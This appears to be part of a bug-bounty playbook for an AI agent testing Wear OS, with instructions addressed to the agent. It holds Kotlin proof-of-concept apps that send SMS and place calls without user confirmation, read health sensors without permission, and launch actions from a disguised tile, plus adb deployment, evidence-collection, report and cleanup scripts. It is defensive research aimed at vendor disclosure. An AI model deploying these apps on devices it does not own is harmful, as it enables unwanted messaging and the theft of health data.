# PART 5 — PoC APK CREATION, IMPACT MEASUREMENT & REPORTING

---

## 5.1 PoC APK Templates

### Template A: Intent Abuse PoC (CVE-2025-12080 Pattern)

```
AGENT_INSTRUCTION: Create an Android Studio project with these files.
This PoC demonstrates silent intent execution on Wear OS.
Replace <TARGET_ACTION> and <TARGET_URI> with the discovered vulnerability.
```

#### AndroidManifest.xml
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.wearos.intentabuse">

    <!-- NOTE: No special permissions required — that's the vulnerability -->
    <uses-feature android:name="android.hardware.type.watch" />

    <application
        android:allowBackup="false"
        android:label="PoC Intent Abuse"
        android:supportsRtl="true"
        android:theme="@android:style/Theme.DeviceDefault">
        
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

#### MainActivity.kt
```kotlin
package com.poc.wearos.intentabuse

import android.app.Activity
import android.content.ActivityNotFoundException
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView

/**
 * PoC: Demonstrates silent message/call/action execution on Wear OS
 * without any permissions and without user confirmation.
 *
 * USAGE: Replace PHONE_NUMBER with a test number YOU control.
 * DO NOT use this against targets you do not own.
 */
class MainActivity : Activity() {

    companion object {
        private const val TAG = "WearOS-PoC"
        // REPLACE with your own test number
        private const val PHONE_NUMBER = "" // Leave empty for safety
        private const val TEST_MESSAGE = "PoC: Silent message sent without user confirmation"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(16, 16, 16, 16)
        }

        val status = TextView(this).apply {
            text = "Wear OS Intent Abuse PoC\n\nTap a button to test."
            textSize = 12f
        }
        layout.addView(status)

        // ── Test 1: SMS via smsto: ──
        layout.addView(createButton("Test SMS (smsto:)") {
            testIntent(
                Intent(Intent.ACTION_SENDTO).apply {
                    data = Uri.parse("smsto:$PHONE_NUMBER")
                    putExtra("sms_body", TEST_MESSAGE)
                },
                "SMS-SENDTO", status
            )
        })

        // ── Test 2: SMS via sms: ──
        layout.addView(createButton("Test SMS (sms:)") {
            testIntent(
                Intent(Intent.ACTION_SENDTO).apply {
                    data = Uri.parse("sms:$PHONE_NUMBER")
                    putExtra("sms_body", TEST_MESSAGE)
                },
                "SMS-SEND", status
            )
        })

        // ── Test 3: MMS ──
        layout.addView(createButton("Test MMS (mmsto:)") {
            testIntent(
                Intent(Intent.ACTION_SENDTO).apply {
                    data = Uri.parse("mmsto:$PHONE_NUMBER")
                    putExtra("sms_body", TEST_MESSAGE)
                },
                "MMS-SENDTO", status
            )
        })

        // ── Test 4: Phone call ──
        layout.addView(createButton("Test CALL (tel:)") {
            testIntent(
                Intent(Intent.ACTION_CALL).apply {
                    data = Uri.parse("tel:$PHONE_NUMBER")
                },
                "CALL", status
            )
        })

        // ── Test 5: Auto-trigger on launch ──
        if (PHONE_NUMBER.isNotEmpty()) {
            Log.w(TAG, "Auto-triggering SMS PoC on launch")
            testIntent(
                Intent(Intent.ACTION_SENDTO).apply {
                    data = Uri.parse("smsto:$PHONE_NUMBER")
                    putExtra("sms_body", "[AUTO] $TEST_MESSAGE")
                },
                "AUTO-SMS", status
            )
        }

        setContentView(layout)
    }

    private fun testIntent(intent: Intent, label: String, status: TextView) {
        try {
            Log.i(TAG, "[$label] Launching intent: ${intent.action} → ${intent.data}")
            startActivity(intent)
            status.text = "[$label] Intent launched!\nCheck if action executed without confirmation."
            Log.i(TAG, "[$label] SUCCESS — Intent launched without exception")
        } catch (e: ActivityNotFoundException) {
            status.text = "[$label] No handler found"
            Log.e(TAG, "[$label] ActivityNotFoundException: ${e.message}")
        } catch (e: SecurityException) {
            status.text = "[$label] Permission denied: ${e.message}"
            Log.e(TAG, "[$label] SecurityException: ${e.message}")
        }
    }

    private fun createButton(text: String, onClick: () -> Unit): Button {
        return Button(this).apply {
            this.text = text
            textSize = 10f
            setOnClickListener { onClick() }
        }
    }
}
```

#### build.gradle.kts (Module level)
```kotlin
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "com.poc.wearos.intentabuse"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.poc.wearos.intentabuse"
        minSdk = 30      // Wear OS 3+
        targetSdk = 34
        versionCode = 1
        versionName = "1.0-poc"
    }

    buildTypes {
        release {
            isMinifyEnabled = false
        }
    }
}

dependencies {
    // Minimal — no third-party SDKs (per Google MVRP requirements)
    implementation("androidx.wear:wear:1.3.0")
}
```

### Template B: Health Data Exfiltration PoC

```kotlin
package com.poc.wearos.healthleak

import android.app.Activity
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.os.Bundle
import android.util.Log
import android.widget.TextView

/**
 * PoC: Attempts to read health sensor data without BODY_SENSORS permission.
 * Tests whether the Health Services permission model is properly enforced.
 */
class HealthLeakActivity : Activity(), SensorEventListener {

    companion object {
        private const val TAG = "WearOS-HealthPoC"
    }

    private lateinit var sensorManager: SensorManager
    private var statusView: TextView? = null
    private val readings = mutableListOf<String>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        statusView = TextView(this).apply {
            text = "Health Sensor PoC\nAttempting sensor access..."
            textSize = 11f
            setPadding(16, 16, 16, 16)
        }
        setContentView(statusView)

        sensorManager = getSystemService(SENSOR_SERVICE) as SensorManager

        // List all available sensors
        val sensors = sensorManager.getSensorList(Sensor.TYPE_ALL)
        Log.i(TAG, "=== Available Sensors (${sensors.size}) ===")
        sensors.forEach { sensor ->
            Log.i(TAG, "  ${sensor.name} (Type: ${sensor.type}, Vendor: ${sensor.vendor})")
        }

        // Attempt to register for health-related sensors WITHOUT permission
        val healthSensorTypes = listOf(
            Sensor.TYPE_HEART_RATE,                    // 21
            Sensor.TYPE_HEART_BEAT,                    // 31
            65538,  // SpO2 (vendor-specific)
            65539,  // Skin temperature (vendor-specific)
            Sensor.TYPE_STEP_COUNTER,                  // 19
            Sensor.TYPE_STEP_DETECTOR,                 // 18
        )

        for (sensorType in healthSensorTypes) {
            val sensor = sensorManager.getDefaultSensor(sensorType)
            if (sensor != null) {
                val registered = sensorManager.registerListener(
                    this, sensor, SensorManager.SENSOR_DELAY_NORMAL
                )
                Log.i(TAG, "[${if (registered) "OK" else "FAIL"}] Registered for: ${sensor.name}")
                if (registered) {
                    readings.add("[REGISTERED] ${sensor.name} — NO permission check!")
                }
            } else {
                Log.i(TAG, "[SKIP] Sensor type $sensorType not available")
            }
        }
    }

    override fun onSensorChanged(event: SensorEvent?) {
        event?.let {
            val reading = "Sensor: ${it.sensor.name} Value: ${it.values.joinToString()}"
            Log.w(TAG, "[DATA-LEAK] $reading")
            readings.add(reading)
            statusView?.text = "DATA RECEIVED!\n\n${readings.takeLast(5).joinToString("\n")}"
        }
    }

    override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}

    override fun onDestroy() {
        super.onDestroy()
        sensorManager.unregisterListener(this)
    }
}
```

### Template C: Tile-Based Silent Action PoC

```kotlin
package com.poc.wearos.tilepoc

import android.content.Intent
import android.net.Uri
import android.util.Log
import androidx.wear.protolayout.*
import androidx.wear.protolayout.ActionBuilders.*
import androidx.wear.protolayout.LayoutElementBuilders.*
import androidx.wear.protolayout.ResourceBuilders.*
import androidx.wear.tiles.*
import com.google.common.util.concurrent.ListenableFuture
import com.google.common.util.concurrent.Futures

/**
 * PoC: Demonstrates that a Tile can launch privileged intents
 * without an Activity confirmation flow.
 *
 * Tiles run in a separate process — no Activity lifecycle means
 * the standard Android confirmation UX patterns cannot be applied.
 */
class MaliciousTileService : TileService() {

    companion object {
        private const val TAG = "WearOS-TilePoC"
        private const val RESOURCES_VERSION = "1"
    }

    override fun onTileRequest(requestParams: RequestBuilders.TileRequest): ListenableFuture<TileBuilders.Tile> {
        Log.i(TAG, "Tile requested — preparing malicious layout")
        
        val tile = TileBuilders.Tile.Builder()
            .setResourcesVersion(RESOURCES_VERSION)
            .setTileTimeline(
                TimelineBuilders.Timeline.Builder()
                    .addTimelineEntry(
                        TimelineBuilders.TimelineEntry.Builder()
                            .setLayout(
                                LayoutElementBuilders.Layout.Builder()
                                    .setRoot(buildClickableLayout())
                                    .build()
                            )
                            .build()
                    )
                    .build()
            )
            .build()
        
        return Futures.immediateFuture(tile)
    }

    private fun buildClickableLayout(): LayoutElement {
        // Create a clickable element that triggers a sensitive intent
        // when the user taps the tile
        return LayoutElementBuilders.Box.Builder()
            .addContent(
                LayoutElementBuilders.Text.Builder()
                    .setText("Tap to send message") // Disguised as legitimate UI
                    .build()
            )
            .setModifiers(
                ModifiersBuilders.Modifiers.Builder()
                    .setClickable(
                        ModifiersBuilders.Clickable.Builder()
                            .setOnClick(
                                LaunchAction.Builder()
                                    .setAndroidActivity(
                                        AndroidActivity.Builder()
                                            .setPackageName("com.google.android.apps.messaging")
                                            .setClassName("com.google.android.apps.messaging.ui.ConversationListActivity")
                                            // The intent launched from a Tile bypasses
                                            // normal Activity confirmation flow
                                            .build()
                                    )
                                    .build()
                            )
                            .build()
                    )
                    .build()
            )
            .build()
    }

    override fun onResourcesRequest(requestParams: RequestBuilders.ResourcesRequest): ListenableFuture<Resources> {
        return Futures.immediateFuture(
            Resources.Builder()
                .setVersion(RESOURCES_VERSION)
                .build()
        )
    }
}
```

---

## 5.2 Build & Deploy PoC

```bash
# ── Build PoC APK ──
cd ./poc_project/
./gradlew assembleDebug

# ── Sign with debug key ──
# (Auto-signed by Gradle in debug mode)

# ── Install on watch ──
adb install -r ./app/build/outputs/apk/debug/app-debug.apk

# ── Verify installation ──
adb shell pm list packages | grep poc

# ── Launch PoC ──
adb shell am start -n "com.poc.wearos.intentabuse/.MainActivity"

# ── Monitor logcat during PoC execution ──
adb logcat -s "WearOS-PoC:*" "WearOS-HealthPoC:*" "WearOS-TilePoC:*"

# ── Capture screen recording ──
adb shell screenrecord /sdcard/poc_recording.mp4 --time-limit 60 &
# Execute PoC, then:
adb pull /sdcard/poc_recording.mp4 ./findings/poc_recording.mp4

# ── Capture screenshots ──
adb shell screencap -p /sdcard/poc_screenshot.png
adb pull /sdcard/poc_screenshot.png ./findings/poc_screenshot.png
```

---

## 5.3 Impact Measurement & Proof

### Impact Evidence Collection

```bash
#!/bin/bash
# ── collect_evidence.sh ──
# Collects all evidence needed for a Google MVRP report

EVIDENCE_DIR="./evidence"
mkdir -p "$EVIDENCE_DIR"/{screenshots,recordings,logs,device_info}

# ── 1. Device info ──
adb shell getprop ro.build.display.id > "$EVIDENCE_DIR/device_info/build.txt"
adb shell getprop ro.build.version.security_patch > "$EVIDENCE_DIR/device_info/patch_level.txt"
adb shell getprop ro.product.model > "$EVIDENCE_DIR/device_info/model.txt"
adb shell getprop ro.build.version.release > "$EVIDENCE_DIR/device_info/android_version.txt"
adb shell pm list packages -f | grep messaging > "$EVIDENCE_DIR/device_info/target_app_version.txt"

# ── 2. Pre-test state ──
adb shell screencap -p /sdcard/pre_test.png
adb pull /sdcard/pre_test.png "$EVIDENCE_DIR/screenshots/01_pre_test.png"

# ── 3. Logcat during test ──
adb logcat -c
adb logcat -v threadtime > "$EVIDENCE_DIR/logs/full_logcat.txt" &
LOGCAT_PID=$!

# ── 4. Screen recording ──
adb shell screenrecord /sdcard/evidence.mp4 --time-limit 120 &
RECORD_PID=$!

echo "=== Evidence collection running ==="
echo "Logcat PID: $LOGCAT_PID"
echo "Recording PID: $RECORD_PID"
echo ""
echo "Now execute the PoC. When done, run:"
echo "  kill $LOGCAT_PID $RECORD_PID"
echo "  adb pull /sdcard/evidence.mp4 $EVIDENCE_DIR/recordings/"
echo ""

# ── 5. After PoC execution ──
# Verify the action actually happened:
# For SMS: Check sent messages folder
# adb shell content query --uri content://sms/sent --projection "address,body,date" | tail -5

# For calls: Check call log
# adb shell content query --uri content://call_log/calls --projection "number,type,date" | tail -5

# ── 6. Post-test screenshot ──
# adb shell screencap -p /sdcard/post_test.png
# adb pull /sdcard/post_test.png "$EVIDENCE_DIR/screenshots/02_post_test.png"
```

### CVSS v3.1 Scoring Guide

```
AGENT_INSTRUCTION: Calculate CVSS score for each finding using these Wear OS considerations.

For CVE-2025-12080 class (Intent Abuse / Confused Deputy):
┌──────────────────────────────────────────────────────┐
│ Metric               │ Value          │ Rationale    │
├──────────────────────────────────────────────────────┤
│ Attack Vector (AV)   │ Local (L)      │ App on watch │
│ Attack Complexity    │ Low (L)        │ Simple intent│
│ Privileges Required  │ None (N)       │ No perms     │
│ User Interaction     │ None (N)       │ Silent exec  │
│ Scope                │ Changed (C)    │ Cross-app    │
│ Confidentiality      │ Low (L)        │ Data read    │
│ Integrity            │ High (H)       │ Send msgs    │
│ Availability         │ None (N)       │ No DoS       │
├──────────────────────────────────────────────────────┤
│ CVSS Score           │ 8.2 HIGH       │              │
└──────────────────────────────────────────────────────┘

For Health Data Leakage:
- If passive data read without permission: CVSS 7.5+ (HIGH)
- If active data exfiltration possible: CVSS 8.0+ (HIGH)

For Data Layer Lateral Movement:
- If phone-side RCE via watch: CVSS 9.0+ (CRITICAL)
- If phone data theft via watch: CVSS 8.5+ (HIGH)
```

---

## 5.4 Google MVRP Report Template

```markdown
# Vulnerability Report: [TITLE]

## Summary
[One paragraph describing the vulnerability, affected component, and impact]

## Affected Component
- **App**: [Package name and version]
- **Platform**: Wear OS [version] on [device model]
- **Build**: [Build ID from getprop]
- **Security Patch Level**: [Date]

## Vulnerability Details

### Root Cause
[Technical explanation of WHY the vulnerability exists]

### CWE Classification
[CWE-XXX: Description]

### CVSS v3.1 Score
[Score] ([Severity]) — [Vector string]

## Reproduction Steps

### Prerequisites
1. Pixel Watch [model] running Wear OS [version] (build: [ID])
2. [App name] version [version] installed
3. PoC APK (attached)

### Steps
1. Install PoC APK on watch: `adb install poc.apk`
2. [Step 2]
3. [Step 3]
4. Observe: [Expected malicious result]

### Video Demonstration
[Attached: poc_demo.mp4 — XX seconds]

## Impact
- [Impact 1: e.g., Silent SMS sending without user consent]
- [Impact 2: e.g., Financial impact — premium rate SMS]
- [Impact 3: e.g., Privacy — messages sent on user's behalf]

## Attack Scenario
[Real-world attack scenario description]
An attacker distributes a benign-looking Wear OS app (e.g., a watch face).
The app requires NO special permissions. When installed, it silently
[performs malicious action] without any user interaction or awareness.

## Proposed Fix
[Suggested remediation — Google values this]
1. Add confirmation dialog before executing ACTION_SENDTO on Wear OS
2. Require explicit permission check in the intent handler
3. Mark the vulnerable Activity as `exported="false"`

## PoC Source Code
[Attached: Complete Android Studio project]

## Attachments
1. poc-app.apk — Compiled PoC
2. poc-source.zip — Full source code
3. poc_demo.mp4 — Screen recording of exploitation
4. logcat_output.txt — Relevant log output
5. device_info.txt — Target device details
```

---

## 5.5 Cleanup After Testing

```bash
#!/bin/bash
# ── cleanup.sh ──
# IMPORTANT: Clean up all PoC artifacts from the watch after testing
# Per user rule: validate that all resources are cleaned up after attack simulations

echo "=== Cleanup: Removing PoC artifacts from watch ==="

# ── Uninstall all PoC apps ──
for pkg in $(adb shell pm list packages | grep "poc" | sed 's/package://'); do
  echo "Uninstalling: $pkg"
  adb shell pm uninstall "$pkg"
done

# ── Remove temporary files ──
adb shell rm -f /sdcard/poc_*.mp4
adb shell rm -f /sdcard/poc_*.png
adb shell rm -f /sdcard/screen.png
adb shell rm -f /sdcard/evidence.mp4
adb shell rm -f /sdcard/pre_test.png
adb shell rm -f /sdcard/post_test.png
adb shell rm -f /data/local/tmp/frida-server

# ── Remove Burp cert if installed ──
adb shell rm -f /sdcard/burp_cert.pem

# ── Kill any remaining Frida server ──
adb shell "pkill -f frida-server" 2>/dev/null

# ── Reset proxy settings ──
adb shell settings put global http_proxy :0

# ── Verify cleanup ──
echo ""
echo "=== Verification ==="
echo "PoC packages remaining: $(adb shell pm list packages | grep -c 'poc')"
echo "Temp files: $(adb shell ls /sdcard/poc_* 2>/dev/null | wc -l)"
echo "Frida running: $(adb shell ps | grep -c frida)"
echo ""
echo "=== Cleanup Complete ==="
```

---

## 5.6 Submission Checklist

```
AGENT_INSTRUCTION: Before submitting to Google MVRP, verify ALL items:

PRE-SUBMISSION CHECKLIST:
[ ] Tested on LATEST Wear OS build and security patch level
[ ] Vulnerability reproduced at least 3 times consistently
[ ] PoC APK uses NO third-party SDKs (only AndroidX/Google)
[ ] PoC APK is the MINIMUM code needed to demonstrate the issue
[ ] Full source code included (not just APK)
[ ] Screen recording captured (30-60 seconds)
[ ] Device info documented (model, build, patch level, app version)
[ ] CVSS score calculated with vector string
[ ] CWE classification assigned
[ ] Impact section describes real-world attack scenario
[ ] Proposed fix included
[ ] All PoC artifacts cleaned up from test device
[ ] Report is CONCISE — Google prefers short, reproducer-first reports

SUBMISSION:
→ File at: https://g.co/vulnz
→ Category: "Android & Google Devices"
→ Include: Device model, OS version, patch level, affected component
```
